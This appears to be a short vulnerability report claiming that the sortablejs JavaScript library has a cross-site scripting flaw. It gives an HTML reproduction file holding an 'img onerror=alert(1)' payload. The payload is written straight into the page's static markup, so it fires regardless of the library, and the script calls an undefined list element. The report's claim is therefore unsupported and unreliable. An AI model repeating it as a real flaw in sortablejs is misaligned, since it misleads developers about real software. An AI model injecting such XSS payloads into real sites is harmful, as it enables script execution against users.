# Description

`sortablejs` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

Copy the below content and save it into a .html file and open in any browser XSS payload will get executed.
```
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Sortable</title>
</head>
<body>
<script src="https://cdn.jsdelivr.net/npm/sortablejs@latest/Sortable.min.js"></script>
//<script src="https://raw.githack.com/SortableJS/Sortable/master/Sortable.js"></script>
  
  <div id="simpleList" class="list-group">
    <div class="list-group-item">ITEM1'<img src=x onerror=alert(1)></div>
    <div class="list-group-item">ITEM2</div>
    <div class="list-group-item">ITEM3</div>
    <div class="list-group-item">ITEM4</div>
    <div class="list-group-item">ITEM5</div>
  </div>
      
  <script>
      Sortable.create(simpleList, { });
      Sortable.create(listWithHandle, {
         handle: '.glyphicon-move',
         animation: 150
		 });
 
  </script>
</body>
</html>
```
